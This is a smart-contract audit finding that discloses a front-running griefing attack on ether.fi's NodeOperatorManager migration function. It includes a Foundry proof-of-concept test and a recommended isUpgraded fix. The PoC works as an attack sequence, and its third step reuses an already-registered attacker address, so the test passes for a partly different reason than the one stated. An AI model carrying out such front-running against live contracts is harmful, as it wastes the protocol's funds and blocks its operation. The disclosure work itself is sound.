# [M] Possible to grief and prevent protocol from migration in `NodeOperatorManager.sol`

## Summary
Severity: Medium
Chain: Smart contract
Component: ether-fi
Published: 2023-11-10
Source: https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/issues/42
Type: hats-finding

## Details
**Github username:** @0xfuje
**Twitter username:** 0xfuje
**Submission hash (on-chain):** 0xcdf04182447950f2a421c34e08da524cc18f04953d78c3e7349310e282306659
**Severity:** medium

**Description:**
## Impact
Protocol can lose huge gas fees, temporary prevention of migration until the issue is fixed

## Description
The `initializeOnUpgrade()` in `NodeOperatorManager` registers every operator with their `totalKeys`, `keysUsed` and `ipfsHash`: this might be a quite expensive operation depending on how much operators need to be migrated. An attacker can prevent the migration and grief the protocol with gas fees during the process.

`src/NodeOperatorManager.sol` - [`initializeOnUpgrade()`](https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/blob/master/src/NodeOperatorManager.sol#L57-L83)
```solidity
    /// @notice Migrates operator details from previous contract
    /// @dev Our previous node operator contract was non upgradeable. We will be moving to an upgradeable version but need this
    ///         function to migrate the data
    function initializeOnUpgrade(
        address[] memory _operator, 
        bytes[] memory _ipfsHash,
        uint64[] memory _totalKeys,
        uint64[] memory _keysUsed
    ) external onlyOwner {
        require((_operator.length == _ipfsHash.length) && (_operator.length == _totalKeys.length) && (_operator.length == _keysUsed.length), "Invalid lengths");
        for(uint256 x = 0; x < _operator.length; x++) {
            require(!registered[_operator[x]], "Already registered");

            KeyData memory keyData = KeyData({
                totalKeys: _totalKeys[x],
                keysUsed: _keysUsed[x],
                ipfsHash: abi.encodePacked(_ipfsHash[x])
            });

            addressToOperatorData[_operator[x]] = keyData;
            registered[_operator[x]] = true;

            emit OperatorRegistered(
                _operator[x],
                keyData.totalKeys,
                keyData.keysUsed,
                _ipfsHash[x]
            );
        }
    }
```
The attack is archived by first registering multiple operators in the previous contract. During the migration when the `initializeOnUpgrade()` will be called by the owner, the attacker will front-run the transaction and register their address via `registerNodeOperator()` that is also registered in the migration function. If the attacker is lucky and sophisticated enough, they will register the address that is close to the last operators, making sure the protocol pays maximum gas fees before the function reverts.
```solidity
    require(!registered[_operator[x]], "Already registered");
```
Note that if the attacker registers many mock node operators that seem valid (perhaps by mimicking other real operator data), it will be hard to filter them out and each migration attempt they can execute this attack to prevent the protocol from migration and grief them one more time with gas fees.

## Proof of Concept
1. navigate to `test/NodeOperatorManager.t.sol`
2. copy the below proof of concept inside `NodeOperatorManagerTest` contract
3. run `forge test --match-test testFail_GriefFrontRunMigration_0xfuje -vvvv`
```solidity
   function testFail_GriefFrontRunMigration_0xfuje() public {
        address attackerAddrOne = vm.addr(1337);
        address attackerAddrTwo = vm.addr(43634);
        address attackerAddrThree = vm.addr(34534);

        address[] memory operators = new address[](5);
        operators[0] = address(bob);
        operators[1] = address(alice);
        operators[2] = attackerAddrOne;
        operators[3] = attackerAddrTwo;
        operators[4] = attackerAddrThree;

        bytes[] memory hashes = new bytes[](5);
        hashes[0] = bobIPFS_Hash;
        hashes[1] = aliceIPFS_Hash;
        // attacker copies other honest operators ipfs hash
        hashes[2] = bobIPFS_Hash; 
        hashes[3] = aliceIPFS_Hash;
        hashes[4] = aliceIPFS_Hash;

        uint64[] memory totalKeys = new uint64[](5);
        totalKeys[0] = 10;
        totalKeys[1] = 15;
        totalKeys[2] = 10;
        totalKeys[3] = 23;
        totalKeys[4] = 15;

        uint64[] memory keysUsed = new uint64[](5);
        keysUsed[0] = 5;
        keysUsed[1] = 1;
        keysUsed[2] = 3;
        keysUsed[3] = 6;
        keysUsed[4] = 5;

        // 2. front-run: first migration
        vm.prank(attackerAddrThree);
        nodeOperatorManagerInstance.registerNodeOperator(hashes[4], totalKeys[4]);
        
        // 1. first migration tx fails
        vm.prank(owner);
        nodeOperatorManagerInstance.initializeOnUpgrade(
            operators,
            hashes,
            totalKeys,
            keysUsed
        );

        // 4. front-run: second migration
        vm.prank(attackerAddrTwo);
        nodeOperatorManagerInstance.registerNodeOperator(hashes[3], totalKeys[3]);

        // 3. second migration tx fails
        vm.prank(owner);
        nodeOperatorManagerInstance.initializeOnUpgrade(
            operators,
            hashes,
            totalKeys,
            keysUsed
        );

        // 6. front-run: third migration
        vm.prank(attackerAddrTwo);
        nodeOperatorManagerInstance.registerNodeOperator(hashes[2], totalKeys[2]);

        // 5. third migration tx fails 
        vm.prank(owner);
        nodeOperatorManagerInstance.initializeOnUpgrade(
            operators,
            hashes,
            totalKeys,
            keysUsed
        );
    }
```

## Recommendation
One easy way to mitigate this is to disallow node registration until `initializeOnUpgrade()` has been called. An `isUpgraded` variable can be initialized and set to true upon completion of `initializeOnUpgrade()`. The `registerNodeOperator()` function must require that `isUpgraded` is true.

```solidity
+	bool isUpgraded;

    function initializeOnUpgrade(, , ,) external onlyOwner {
            ...
            ...
+          isUpgraded = true;
    }

    function registerNodeOperator(
        bytes memory _ipfsHash,
        uint64 _totalKeys
    ) public whenNotPaused {
+          require(isUpgraded, "Contract not yet upgraded");
            require(!registered[msg.sender], "Already registered");
            ...
    }
```
